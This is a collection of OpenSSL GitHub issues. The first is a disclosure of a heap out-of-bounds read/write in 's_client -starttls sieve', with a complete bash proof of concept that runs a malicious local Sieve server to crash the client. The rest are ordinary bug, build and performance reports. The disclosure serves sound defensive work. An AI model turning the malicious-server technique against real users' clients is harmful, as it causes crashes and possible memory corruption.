The documentation of [d2i_*](https://docs.openssl.org/master/man3/d2i_X509) suggests that all ASN1 datatypes have `d2i_ASN1_*_bio` and `i2d_ASN1_*_bio` functions, but they don't seem to exist. items.body:
## Summary

**OpenSSL has confirmed by email that this issue will be handled as a regular bug, so I am now disclosing it publicly and submitting it to the OpenSSL public GitHub repository as requested.**


In released OpenSSL versions that support `s_client -starttls sieve`, a malicious Sieve server can reply to `STARTTLS` with exactly two non-NUL bytes and make `openssl s_client -starttls sieve` treat a non-NUL-terminated heap buffer as a C string.

A malicious server can remotely crash the client. Because the loop writes back transformed bytes while scanning, this is a heap out-of-bounds read with possible out-of-bounds writes before a `'\0'` is found.

## Details

This affects the documented `s_client -starttls sieve` path:

- `README.md` describes `openssl` as a supported command-line tool:

```text
- **openssl**
  the OpenSSL command line tool, a swiss army knife for cryptographic tasks,
  testing and analyzing.
```

- `doc/man1/openssl-s_client.pod.in` explicitly documents `-starttls sieve`:

```text
=item B<-starttls> I<protocol>
...
supported keywords are "smtp", "pop3", "imap", "ftp", "xmpp", "xmpp-server",
"irc", "postgres", "mysql", "lmtp", "nntp", "sieve" and "ldap".
```

The relevant code in the current tree is:

- `apps/s_client.c`
- `apps/lib/apps.c`

The vulnerable sequence is:

```c
mbuf_len = BIO_read(sbio, mbuf, BUFSIZZ - 1);
mbuf[mbuf_len] = '\0';
...
strncpy(sbuf, mbuf, 2);
make_uppercase(sbuf);
```

`make_uppercase()` assumes the input is NUL-terminated:

```c
for (i = 0; string[i] != '\0'; i++)
    string[i] = toupper((unsigned char)string[i]);
```

But `sbuf` comes from `app_malloc()`, which does not zero memory:

```c
void *vp = OPENSSL_malloc(sz);
```

So if the attacker-controlled Sieve server sends a 2-byte reply such as `ok` after receiving `STARTTLS\r\n`:

1. `strncpy(sbuf, mbuf, 2)` copies exactly 2 bytes and does not append `'\0'`
2. `make_uppercase(sbuf)` scans forward as though `sbuf` were a valid C string
3. the loop continues past the end of the 16 KiB heap allocation until a zero byte is found

I verified this in two ways:

1. A malicious local Sieve stub confirms that the real `apps/openssl s_client -starttls sieve` path sends `STARTTLS\r\n`, so attacker-controlled network input really reaches this code.
2. On a current-`HEAD` ASan build, the real `apps/openssl` binary reports `AddressSanitizer: heap-buffer-overflow` with:
   `#0 ... in make_uppercase apps/lib/apps.c:3774`
   `#1 ... in s_client_main apps/s_client.c:3028`

The vulnerable Sieve support itself was introduced by commit `20967afb7f4a2613a6d7230bcbdf99140bccd677` (`Add Sieve support (RFC 5804) to s_client ("-starttls sieve")`, dated February 9, 2017). In this checkout, the same vulnerable pattern is present in released tags such as `OpenSSL_1_1_1`, `OpenSSL_1_1_1w`, `openssl-3.0.20`, `openssl-3.1.8`, `openssl-3.2.6`, `openssl-3.3.7`, `openssl-3.4.5`, `openssl-3.5.6`, `openssl-3.6.2`, and `openssl-4.0.0`.

Historically, OpenSSL has treated malicious-server-triggered client crashes as security issues. `CHANGES.md` includes entries such as:

```text
* OpenSSL DTLS clients enabling anonymous (EC)DH ciphersuites are subject
  to a denial of service attack. A malicious server can crash the client
```

and:

```text
* Bad (EC)DHE parameters cause a client crash
  If a malicious server supplies bad parameters for a DHE or ECDHE key
  exchange then this can result in the client attempting to dereference a
  NULL pointer leading to a client crash.
```

So this appears to fit the usual security-reporting boundary.

## PoC

Prerequisites:

- run this from the OpenSSL source tree root, or set `ROOT=/path/to/tree`
- Linux with `git`, `perl`, `make`, `gcc`, and `python3`
- this script builds its own temporary ASan-instrumented `apps/openssl`; it does not rely on prebuilt artifacts

Copy/paste this as one block:

```bash
bash <<'EOF'
set -euo pipefail

ROOT="${ROOT:-$PWD}"
PORT="${PORT:-19190}"
HEAD="$(git -C "$ROOT" rev-parse HEAD)"

WORKDIR="$(mktemp -d)"
WT="$WORKDIR/asan-tree"
SERVER_PID=""
WT_ADDED=0
NPROC="$(getconf _NPROCESSORS_ONLN 2>/dev/null || echo 4)"

for cmd in git perl make gcc python3; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
        echo "$cmd is required" >&2
        exit 1
    fi
done

if [ ! -f "$ROOT/Configure" ]; then
    echo "ROOT does not look like an OpenSSL source tree: $ROOT" >&2
    exit 1
fi

cleanup() {
    if [ -n "$SERVER_PID" ]; then
        kill "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    fi
    if [ "$WT_ADDED" = "1" ]; then
        git -C "$ROOT" worktree remove -f "$WT" >/dev/null 2>&1 || rm -rf "$WT"
    fi
    rm -rf "$WORKDIR"
}
trap cleanup EXIT

git -C "$ROOT" worktree add --detach "$WT" "$HEAD" >/dev/null
WT_ADDED=1

echo "[1/3] Building an ASan-instrumented apps/openssl"
(
    cd "$WT"
    ./Configure enable-asan no-shared -g -O1 >"$WORKDIR/configure.log" 2>&1
    make build_generated >"$WORKDIR/build-generated.log" 2>&1
    env -u OPENSSL_API_COMPAT make -j"$NPROC" apps/openssl >"$WORKDIR/build.log" 2>&1
)

cat >"$WORKDIR/server.py" <<'PY'
import pathlib
import socket
import sys

port = int(sys.argv[1])
capture = pathlib.Path(sys.argv[2])

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("127.0.0.1", port))
    sock.listen(1)
    conn, _ = sock.accept()
    with conn:
        conn.sendall(b'"STARTTLS"\r\nOK\r\n')
        data = b""
        while b"\r\n" not in data:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
        capture.write_bytes(data)
        conn.sendall(b"ok")
PY

echo "[2/3] Starting a malicious Sieve stub"
python3 "$WORKDIR/server.py" "$PORT" "$WORKDIR/server_input.bin" >"$WORKDIR/server.log" 2>&1 &
SERVER_PID=$!
sleep 0.2

set +e
(
    cd "$WT"
    ASAN_OPTIONS="detect_leaks=0:abort_on_error=1:halt_on_error=1:malloc_fill_byte=65:max_malloc_fill_size=20000" \
        ./apps/openssl s_client -brief -starttls sieve -connect 127.0.0.1:"$PORT" \
        </dev/null >"$WORKDIR/s_client.stdout" 2>"$WORKDIR/s_client.stderr"
)
CLIENT_RC=$?
set -e

wait "$SERVER_PID"
SERVER_PID=""

python3 - "$WORKDIR/server_input.bin" <<'PY'
import pathlib
import sys

data = pathlib.Path(sys.argv[1]).read_bytes()
if data != b"STARTTLS\r\n":
    raise SystemExit(f"unexpected command from s_client: {data!r}")
print("server saw:", data.decode("ascii").rstrip())
PY

echo "[3/3] Checking the ASan stack"
if ! grep -q "AddressSanitizer: heap-buffer-overflow" "$WORKDIR/s_client.stderr"; then
    echo "the ASan build did not report heap-buffer-overflow" >&2
    sed -n '1,40p' "$WORKDIR/s_client.stderr" >&2
    exit 1
fi

if ! grep -Eq 'make_uppercase .*apps/lib/apps.c' "$WORKDIR/s_client.stderr"; then
    echo "missing make_uppercase frame in ASan trace" >&2
    sed -n '1,40p' "$WORKDIR/s_client.stderr" >&2
    exit 1
fi

if ! grep -Eq 's_client_main .*apps/s_client.c' "$WORKDIR/s_client.stderr"; then
    echo "missing s_client_main frame in ASan trace" >&2
    sed -n '1,40p' "$WORKDIR/s_client.stderr" >&2
    exit 1
fi

echo "s_client exit code: $CLIENT_RC"
sed -n '1,24p' "$WORKDIR/s_client.stderr"

echo
echo "PoC completed successfully."
EOF
```

## Impact

This is a remotely reachable client-side memory-safety bug in a documented `openssl s_client` mode.

An attacker who controls a Sieve server, or who can induce a user to connect to an attacker-controlled Sieve endpoint with `openssl s_client -starttls sieve`, can trigger:

- heap out-of-bounds reads
- possible heap out-of-bounds writes in the same loop
- client crash / denial of service
- undefined memory corruption before a `'\0'` byte is encountered

I have not demonstrated code execution. The strongest demonstrated impact is client-side DoS with memory corruption potential.

The affected population is users of released OpenSSL versions who use the `apps/openssl` command-line client in Sieve STARTTLS mode. This does not directly affect ordinary `libssl` / `libcrypto` consumers unless they ship or reuse this application-side parsing logic.

## Affected versions

Released versions containing `s_client -starttls sieve`, including:

- `OpenSSL_1_1_1` through `OpenSSL_1_1_1w`
- `openssl-3.0.0` through `openssl-3.0.20`
- `openssl-3.1.0` through `openssl-3.1.8`
- `openssl-3.2.0` through `openssl-3.2.6`
- `openssl-3.3.0` through `openssl-3.3.7`
- `openssl-3.4.0` through `openssl-3.4.5`
- `openssl-3.5.0` through `openssl-3.5.6`
- `openssl-3.6.0` through `openssl-3.6.2`
- `openssl-4.0.0`

Not present in the tags I checked before Sieve support existed, such as `OpenSSL_1_0_2u` and `OpenSSL_1_1_0l`.

items.title: Remote heap out-of-bounds read/write in `openssl s_client -starttls sieve` STARTTLS response parsing

items.body:
In our performance tests of OpenSSL 3.5.6, we found that compared to OpenSSL 3.0.12, the throughput of Nginx short connections dropped by about 10%.

nginx version: nginx/1.22.1

The test steps are as follows:
```
ethtool -C ${interface} adaptive-rx off
nginx -c ${NGINX_PATH}/nginx_4.conf
./wrk-4.2.0/wrk -c 2000 -d 60s -t 20 -H Connection: close --latency --timeout 5s 
```

We discovered it through binary search:
|Commit|Headline||
|-|-|-|
|e2d5742b14|Transfer the functionality from ssl3_read_n to the new record layer|-13%|
|6366bdd9be|Remove the separation betweeen enc_read_ctx and enc_write_ctx|-3%|
|2b71b04220|Create the write record layer method and object and use it|-6%|
|2b71b04220|Create the write record layer method and object and use it|-15%|

https://github.com/openssl/openssl/pull/18132
https://github.com/openssl/openssl/pull/19198

This part of the patch seems to be related to the record layer. May I ask if the community has noticed any degradation in this part?

items.body:
### Summary

Building OpenSSL 3.5.7 from the release tarball on Solaris 11.4 (x86_64) intermittently fails while linking `fuzz/acert-test` during `gmake -j<N>`:

```
rm -f libcrypto.so && ln -s libcrypto.so.3 libcrypto.so
gcc -fPIC -m64 -Wa,--noexecstack -Wall -O3 -shared -static-libgcc -Wl,-Bsymbolic ... -o providers/fips.so ...
rm -f fuzz/acert-test
${LDCMD:-gcc} -m64 -Wa,--noexecstack -Wall -O3 -L.  ... 	-o fuzz/acert-test 	fuzz/acert-test-bin-acert.o 	fuzz/acert-test-bin-test-corpus.o 	-lcrypto -lsocket -lnsl -ldl
Undefined			first referenced
 symbol  			    in file
Poly1305_Init                       ./libcrypto.so
Poly1305_Update                     ./libcrypto.so
Poly1305_Final                      ./libcrypto.so
Poly1305_ctx_size                   ./libcrypto.so
ld: fatal: symbol referencing errors
collect2: error: ld returned 1 exit status
gmake[1]: *** [Makefile:29189: fuzz/acert-test] Error 1
make: *** [Makefile:4090: build_sw] Error 2
```

The failure is **intermittent**: the same host built the same tarball with the same configuration successfully twice earlier the same day. In the failing run, the `rm -f libcrypto.so && ln -s libcrypto.so.3 libcrypto.so` recipe executes immediately before the `fuzz/acert-test` link in the output, which suggests the fuzz binary's `-L. -lcrypto` resolved `./libcrypto.so` in an inconsistent state under parallel make. The unresolved `Poly1305_*` symbols are libcrypto internals that the shared library does not export, which also raises the question of whether `fuzz/acert-test` is intended to link the static `libcrypto.a` like the test programs do (the `test/*` link lines in the same build reference `libcrypto.a` explicitly, while the `fuzz/acert-test` line uses `-lcrypto`).

### Environment

- OpenSSL 3.5.7 release tarball (sha256 `a8c0d28a529ca480f9f36cf5792e2cd21984552a3c8e4aa11a24aa31aeac98e8`)
- Oracle Solaris 11.4 x86_64, gcc from the IPS repository, Sun ld
- `./Configure solaris64-x86_64-gcc shared enable-fips --prefix=... --openssldir=... -Wl,-R<libdir> -Wl,-rpath,<libdir>`
- `gmake -j<nproc>` (GNU make)

### Steps to reproduce

`./Configure solaris64-x86_64-gcc shared enable-fips` followed by repeated parallel builds from a clean tree. Reproduction is intermittent (roughly 1 in 3 in our builds).

### Workaround

Configuring with `no-tests` avoids the fuzz/test build targets entirely.

I'm happy to provide full build logs or run diagnostics on the affected host.

labels.name: issue: bug report

There are places in the code that doesn't provide any meaningful information like in `crypto/ec/curve448/eddsa.c`:
```c
/*
 * EdDSA signing.
 *
 * signature (out): The signature.
 * privkey (in): The private key.
 * pubkey (in):  The public key.
 * message (in):  The message to sign.
 * message_len (in):  The length of the message.
```

It would be nice to clean these up, as it only takes up space and makes the code base harder to read

items.body:
The ICC intel compiler is deprecated and replaced by the ICX (clang based) compiler.
Some users/companies allow critical CVS's fixes to be included into the Fips module.
Building the Fips library is done by using the latests of the OpenSSL branch version in which the Fips module was verified.
OpenSSL 3.5 => Fips 140-3
OpenSSL 3.0 => Fips 140-2
Without PR 30313 being merged into 3.0 and 3.5, the Fips modules would face a significant performance drop for users they have to change to the ICX compiler (due to not using optimised ASM).

This issue is requesting the PR 30313 to be merged into OpenSSL 3.0 and OpenSSL 3.5 branch.
items.title: Request PR 30313 (Add icx compiler version support in perl asm scripts) to be merged in branches they are used for Fips validation

items.body:
Commit https://github.com/openssl/openssl/commit/c86db77e70bcbe67bfa636abb5fb2f195bd7a729 added mfail tests for RSA pkcs1 and oaep.

They fail pretty consistently (but with different failure points) on s390 with the following:

```
#     # Subtest: ../../test/rsa_test
#     1..7
#         # Subtest: test_rsa_pkcs1
#         1..3
#         ok 1 - iteration 1
#         ok 2 - iteration 2
#         ok 3 - iteration 3
#     ok 1 - test_rsa_pkcs1
#         # Subtest: test_rsa_oaep
#         1..3
#         ok 4 - iteration 1
#         ok 5 - iteration 2
#         ok 6 - iteration 3
#     ok 2 - test_rsa_oaep
#         # Subtest: test_rsa_pkcs1_mfail
#         1..3
#             # Subtest: test_rsa_pkcs1_mfail[0]
#             1..2
#             ok 1 - counting (106 allocations)
            # ERROR: (int) 'rv == 0' failed @ test/testutil/driver.c:361
            # [1] compared to [0]
            # ERROR:  @ test/testutil/driver.c:362
            # mfail test 'test_rsa_pkcs1_mfail': allocation failure at point 28 not handled
            #
            # ERROR: (int) 'rv == 0' failed @ test/testutil/driver.c:361
            # [1] compared to [0]
            # ERROR:  @ test/testutil/driver.c:362
            # mfail test 'test_rsa_pkcs1_mfail': allocation failure at point 29 not handled
            #
            # ERROR: (int) 'rv == 0' failed @ test/testutil/driver.c:361
            # [1] compared to [0]
            # ERROR:  @ test/testutil/driver.c:362
            # mfail test 'test_rsa_pkcs1_mfail': allocation failure at point 85 not handled
            #
            # ERROR: (int) 'rv == 0' failed @ test/testutil/driver.c:361
            # [1] compared to [0]
            # ERROR:  @ test/testutil/driver.c:362
            # mfail test 'test_rsa_pkcs1_mfail': allocation failure at point 86 not handled
            #
            # ERROR: (int) 'rv == 0' failed @ test/testutil/driver.c:361
            # [1] compared to [0]
            # ERROR:  @ test/testutil/driver.c:362
            # mfail test 'test_rsa_pkcs1_mfail': allocation failure at point 89 not handled
            #
../../util/wrap.pl ../../test/rsa_test => 132
not ok 2 - running rsatest
```

I debugged using `OPENSSL_TEST_MFAIL_BACKTRACE=1` and found out that its failing because of the following:

```
 MFAIL_BT (failure injection point)
    #0 0x03ffbd437c37 in __sanitizer_print_stack_trace (/lib64/libasan.so.8+0x137c37) (BuildId: 627253be202babade8f534a2b313d4c11de9
8949)
    #1 0x00000101eea7 in mfail_print_bt test/mfail/mfail.c:76
    #2 0x00000101eea7 in should_fail test/mfail/mfail.c:113
    #3 0x00000101eea7 in should_fail test/mfail/mfail.c:96
    #4 0x00000101eea7 in mf_malloc test/mfail/mfail.c:123
    #5 0x0000010cf013 in CRYPTO_malloc crypto/mem.c:196
    #6 0x0000010cf309 in CRYPTO_zalloc crypto/mem.c:226
    #7 0x0000010c33a7 in CRYPTO_calloc crypto/array_alloc.c:35
    #8 0x0000014fcba5 in s390x_HMAC_init crypto/hmac/hmac_s390x.c:86
    #9 0x0000014faaf9 in HMAC_Init_ex crypto/hmac/hmac.c:56
    #10 0x000001127045 in ossl_rsa_prf crypto/rsa/rsa_pk1.c:320
    #11 0x000001128819 in ossl_rsa_padding_check_PKCS1_type_2 crypto/rsa/rsa_pk1.c:434
    #12 0x000001126751 in rsa_ossl_private_decrypt crypto/rsa/rsa_ossl.c:659
    #13 0x00000101e1a7 in test_rsa_pkcs1_mfail test/rsa_test.c:323
    #14 0x00000102045b in mfail_run_test test/testutil/driver.c:340
    #15 0x000001022d9b in run_tests test/testutil/driver.c:494
    #16 0x0000010108af in main test/testutil/main.c:52
    #17 0x03ffbca34adb in __libc_start_call_main (/lib64/libc.so.6+0x34adb) (BuildId: 623aedc7a5a39fffc3779d9034a805dbd5d12756)
    #18 0x03ffbca34c35 in __libc_start_main@@GLIBC_2.34 (/lib64/libc.so.6+0x34c35) (BuildId: 623aedc7a5a39fffc3779d9034a805dbd5d1275
6)
    #19 0x00000101c529  (/root/openssl/test/rsa_test+0x101c529) (BuildId: 6502d521b692de1c80ecb7fb9a59f996f0130d82)
            # ERROR: (int) 'rv == 0' failed @ test/testutil/driver.c:361
            # [1] compared to [0]
            # ERROR:  @ test/testutil/driver.c:362
            # mfail test 'test_rsa_pkcs1_mfail': allocation failure at point 131 not handled
            #
        # 000003FFBDB737C0:error:078C0100:common libcrypto routines::malloc failure:crypto/hmac/hmac_s390x.c:86:
#             # OPENSSL_TEST_RAND_SEED=1781265416
#             not ok 2 - injection (132 iterations, 0.404s)
#         # OPENSSL_TEST_RAND_SEED=1781265416
#         not ok 7 - iteration 1
```

So the malloc failure hits within `s390x_HMAC_init()` at https://github.com/openssl/openssl/blob/afd25111f12ac3f8c7009ea84d827718e5620e31/crypto/hmac/hmac_s390x.c#L86. There the error is handled and s390x_HMAC_init() returns zero (line 89), but the caller `HMAC_Init_ex()` does not treat this as error, but just as an indication that the s390 specific acceleration can not be used and thus continues with the software path: https://github.com/openssl/openssl/blob/afd25111f12ac3f8c7009ea84d827718e5620e31/crypto/hmac/hmac.c#L57

So the malloc error is ignored in this case, but that's OK. 
I could imagine other places that react similarly within certain platform specific acceleration routines. 

What is the suggestion how such things should be handled? Technically its not a problem if the failing malloc is ignored here, it just takes the (possibly) slower software path. 

Or should we update the code to always make it truly fail if an allocation fails, even though there would be a software fallback?

items.body:
`include/openssl/tls1.h` contains two duplicate lines of code.

1st copy:

https://github.com/openssl/openssl/blob/c82a466566e54d539161202c6b2a4e303a9113a3/include/openssl/tls1.h#L950-L951

2nd copy, same file, a few lines down:

https://github.com/openssl/openssl/blob/c82a466566e54d539161202c6b2a4e303a9113a3/include/openssl/tls1.h#L1107-L1108

If this is in intentional, just close this issue. If not, one of the two instances might be dropped.
